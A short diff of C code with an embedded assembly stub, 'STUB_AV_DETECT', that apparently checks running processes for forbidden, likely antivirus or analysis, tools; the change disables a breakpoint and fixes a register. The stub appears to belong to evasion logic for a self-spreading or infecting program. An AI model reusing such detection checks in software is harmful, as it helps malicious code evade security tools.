@@ -233,12 +233,12 @@ static const char STUB_AV_DETECT[] =
 "jmp process_entry_loop\n"
 
 "found_forbidden:\n"
-"break\n"//; [B7] processus interdit détecté : rsi = debut du nom de processus lu
+//"break\n"//; [B7] processus interdit détecté : rsi = debut du nom de processus lu
 "mov rax, 1\n"
 "mov rdi, 1\n"
 "lea rsi, [found_msg]\n"
 "xor rdx, rdx\n"
-"_SET dl, [len_found_msg]\n"
+"_SET rdx, [len_found_msg]\n" // dl
 "syscall\n"
 "lea rsi, [rsp]\n"
 "add rsi, 4096\n"
